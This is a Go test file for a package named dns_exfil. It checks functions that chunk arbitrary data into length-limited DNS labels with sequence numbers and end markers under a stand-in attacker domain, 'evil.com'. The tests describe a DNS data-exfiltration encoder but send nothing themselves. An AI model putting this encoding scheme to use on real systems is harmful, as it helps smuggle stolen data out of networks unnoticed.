package dns_exfil

import (
	"strings"
	"testing"
)

func TestSplitLabels(t *testing.T) {
	tests := []struct {
		input  string
		maxLen int
		want   int
	}{
		{"abc", 63, 1},
		{"", 63, 0},
		{strings.Repeat("a", 63), 63, 1},
		{strings.Repeat("a", 64), 63, 2},
		{strings.Repeat("a", 126), 63, 2},
		{strings.Repeat("a", 127), 63, 3},
	}

	for _, tt := range tests {
		labels := splitLabels(tt.input, tt.maxLen)
		if len(labels) != tt.want {
			t.Errorf("splitLabels(%d chars, max %d) = %d labels, want %d",
				len(tt.input), tt.maxLen, len(labels), tt.want)
		}
		for i, l := range labels {
			if len(l) > tt.maxLen {
				t.Errorf("label %d exceeds max length: %d > %d", i, len(l), tt.maxLen)
			}
		}
		joined := strings.Join(labels, "")
		if joined != tt.input {
			t.Errorf("splitLabels lost data: got %q, want %q", joined, tt.input)
		}
	}
}

func TestSplitLabelsEmpty(t *testing.T) {
	labels := splitLabels("", 63)
	if len(labels) != 0 {
		t.Errorf("expected 0 labels for empty input, got %d", len(labels))
	}
}

func TestEncodeChunks(t *testing.T) {
	data := []byte("hello world this is a test of dns exfiltration")
	domain := "evil.com"

	chunks := encodeChunks(data, domain)
	if len(chunks) == 0 {
		t.Fatal("expected at least one chunk")
	}

	last := chunks[len(chunks)-1]
	if last != "ffff.end.evil.com" {
		t.Errorf("last chunk should be end marker, got: %s", last)
	}

	for i, c := range chunks {
		if len(c) > maxDomainLen {
			t.Errorf("chunk %d exceeds max domain length: %d > %d", i, len(c), maxDomainLen)
		}
		if !strings.HasSuffix(c, "."+domain) {
			t.Errorf("chunk %d doesn't end with domain: %s", i, c)
		}
	}
}

func TestEncodeChunksSequenceNumbers(t *testing.T) {
	data := []byte(strings.Repeat("A", 100))
	domain := "test.io"

	chunks := encodeChunks(data, domain)
	seenSeqs := make(map[string]bool)
	for _, c := range chunks[:len(chunks)-1] {
		parts := strings.SplitN(c, ".", 2)
		seq := parts[0]
		if seenSeqs[seq] {
			t.Errorf("duplicate sequence number: %s", seq)
		}
		seenSeqs[seq] = true
	}
}

func TestEncodeChunksSmallData(t *testing.T) {
	data := []byte("hi")
	domain := "x.io"

	chunks := encodeChunks(data, domain)
	if len(chunks) < 2 {
		t.Fatal("expected at least data chunk + end marker")
	}

	if chunks[len(chunks)-1] != "ffff.end.x.io" {
		t.Errorf("missing end marker")
	}
}

func TestEncodeSmallerSplitsData(t *testing.T) {
	data := []byte("abcdefghijklmnop")
	domain := "test.com"
	seq := 5

	result := encodeSmaller(data, domain, seq)
	if len(result) != 2 {
		t.Fatalf("expected 2 sub-chunks, got %d", len(result))
	}

	for _, r := range result {
		if !strings.HasSuffix(r, ".test.com") {
			t.Errorf("sub-chunk missing domain suffix: %s", r)
		}
		if !strings.Contains(r, "0005") {
			t.Errorf("sub-chunk missing sequence: %s", r)
		}
	}
}

func TestEncodeChunksLabelLengths(t *testing.T) {
	data := []byte(strings.Repeat("X", 200))
	domain := "d.io"

	chunks := encodeChunks(data, domain)
	for i, c := range chunks {
		parts := strings.Split(c, ".")
		for j, label := range parts {
			if len(label) > maxLabelLen {
				t.Errorf("chunk %d label %d exceeds %d: len=%d (%s)",
					i, j, maxLabelLen, len(label), label)
			}
		}
	}
}
